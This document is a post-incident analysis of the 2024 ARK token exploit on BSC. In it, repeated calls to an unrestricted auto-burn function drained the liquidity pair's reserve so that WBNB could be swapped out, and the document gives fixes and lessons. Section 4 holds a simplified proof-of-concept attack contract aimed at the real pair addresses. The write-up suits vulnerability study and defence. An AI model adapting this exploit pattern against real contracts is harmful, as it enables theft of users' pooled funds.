# ARK — autoBurnLiquidityPairTokens Business Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | ARK |
| **Chain** | BSC |
| **Loss** | ~348 BNB |
| **ARK Token** | [0xde698B5B](https://bscscan.com/address/0xde698B5BBb4A12DDf2261BbdF8e034af34399999) |
| **ARK/WBNB Pair** | [0xc0F54B87](https://bscscan.com/address/0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F) |
| **Router** | [0x10ED43C7](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | Repeatedly calling `autoBurnLiquidityPairTokens()` to drain the ARK reserve of the ARK/WBNB pair, then extracting WBNB at a favorable rate from the imbalanced reserves |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ARK_exp.sol) |

---

## 1. Vulnerability Overview

The `autoBurnLiquidityPairTokens()` function of the ARK token is a mechanism that automatically burns ARK tokens from the LP pair. Repeatedly calling this function progressively drains the pair's ARK reserve, severely skewing the WBNB/ARK ratio. Once the reserve fell below a threshold (~1.7B), the attacker injected 100 WBNB and the remaining ARK into the pair, then extracted WBNB at a favorable exchange rate from the imbalanced reserves.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no limit on repeated calls to autoBurnLiquidityPairTokens
function autoBurnLiquidityPairTokens() external {
    // No call count or block restriction
    // Burns ARK tokens from the pair → reserve decreases
    uint256 pairBalance = balanceOf(liquidityPair);
    uint256 burnAmount  = pairBalance * burnRate / 10000;
    _burn(liquidityPair, burnAmount);
    IUniswapV2Pair(liquidityPair).sync();  // update reserves
}

// ✅ Safe code: limited to once per block + minimum reserve protection
uint256 private lastBurnBlock;
uint256 public constant MIN_RESERVE = 1_000_000_000e18;

function autoBurnLiquidityPairTokens() external {
    require(block.number > lastBurnBlock + BURN_COOLDOWN, "too frequent");
    lastBurnBlock = block.number;
    (uint112 r0,,) = IUniswapV2Pair(liquidityPair).getReserves();
    require(r0 > MIN_RESERVE, "reserve too low");
    uint256 burnAmount = uint256(r0) * burnRate / 10000;
    _burn(liquidityPair, burnAmount);
    IUniswapV2Pair(liquidityPair).sync();
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: ARK_decompiled.sol
contract ARK {
    function autoBurnLiquidityPairTokens() external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Repeatedly call autoBurnLiquidityPairTokens()
  │         └─ ARK reserve drains to ~1.7B
  │
  ├─→ [2] Confirm ARK reserve is below threshold
  │
  ├─→ [3] Inject 100 WBNB + remaining ARK into the pair
  │         └─ Reserve ratio becomes extremely imbalanced
  │
  ├─→ [4] Execute swap() against imbalanced reserves
  │         └─ Extract large amount of WBNB at favorable rate
  │
  └─→ [5] ~348 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IARK {
    function autoBurnLiquidityPairTokens() external;
}

interface Uni_Pair_V2 {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract AttackContract {
    IARK       constant ark    = IARK(0xde698B5BBb4A12DDf2261BbdF8e034af34399999);
    Uni_Pair_V2 constant pair  = Uni_Pair_V2(0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F);
    IERC20     constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        // [1] Loop until ARK reserve drops below ~1.7B
        (uint112 r0,,) = pair.getReserves();
        while (r0 > 1_700_000_000e18) {
            ark.autoBurnLiquidityPairTokens();
            (r0,,) = pair.getReserves();
        }

        // [2] Inject 100 WBNB + ARK into the pair
        WBNB.transfer(address(pair), 100 ether);
        IERC20(address(ark)).transfer(address(pair), arkAmount);

        // [3] Extract WBNB from imbalanced reserves
        (uint112 newR0, uint112 newR1,) = pair.getReserves();
        uint wbnbOut = calculateOutput(newR0, newR1, 100 ether);
        pair.swap(0, wbnbOut, address(this), "");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw (no repeated-call restriction) |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (repeated calls to autoBurnLiquidityPairTokens) |
| **DApp Category** | Auto-burn token + LP pair |
| **Impact** | LP reserve drained, followed by WBNB theft |

## 6. Remediation Recommendations

1. **Burn cooldown**: Allow at most one burn per block or per fixed time interval
2. **Minimum reserve protection**: Halt burning if LP reserves fall below a configured threshold
3. **Per-TX burn cap**: Limit the maximum percentage that can be burned in a single transaction
4. **Caller restriction**: Restrict the `autoBurn` function so only the owner or a trusted bot can call it

## 7. Lessons Learned

- An auto-burn mechanism with no repeated-call restriction can drain LP reserves in a very short time.
- Swapping against sub-threshold reserves creates an extremely unfavorable exchange rate that benefits the attacker.
- All token supply management functions (mint/burn) must have call-frequency limits and maximum impact caps.